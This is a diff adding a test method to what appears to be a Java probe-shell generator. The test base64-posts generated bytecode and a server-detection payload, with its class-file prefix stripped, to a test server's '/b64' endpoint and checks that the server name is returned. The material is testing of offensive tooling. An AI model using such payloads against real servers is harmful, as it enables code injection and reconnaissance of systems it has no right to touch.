@@ -50,6 +50,34 @@ public class ProbeAssertion {
     }
 
     @SneakyThrows
+    public static void responseBytecodeWithoutPrefixIsOk(String url, String server, int targetJreVersion) {
+        ProbeConfig probeConfig = ProbeConfig.builder()
+                .probeMethod(ProbeMethod.ResponseBody)
+                .probeContent(ProbeContent.Bytecode)
+                .targetJreVersion(targetJreVersion)
+                .debug(true)
+                .shrink(true)
+                .build();
+        String reqParamName = "payload";
+        ResponseBodyConfig responseBodyConfig = ResponseBodyConfig.builder()
+                .server(server)
+                .reqParamName(reqParamName)
+                .build();
+        ProbeShellResult probeResult = ProbeShellGenerator.generate(probeConfig, responseBodyConfig);
+        RequestBody requestBody = new FormBody.Builder()
+                .add("data", probeResult.getShellBytesBase64Str())
+                .add(reqParamName, DetectionTool.getServerDetection().replace("yv66vgAAAD", ""))
+                .build();
+        Request request = new Request.Builder()
+                .header("Content-Type", "application/x-www-form-urlencoded")
+                .url(url + "/b64").post(requestBody)
+                .build();
+        try (Response response = new OkHttpClient().newCall(request).execute()) {
+            assertEquals(server, response.body().string());
+        }
+    }
+
+    @SneakyThrows
     public static void responseCommandIsOk(String url, String server, int targetJreVersion) {
         ProbeConfig probeConfig = ProbeConfig.builder()
                 .probeMethod(ProbeMethod.ResponseBody)
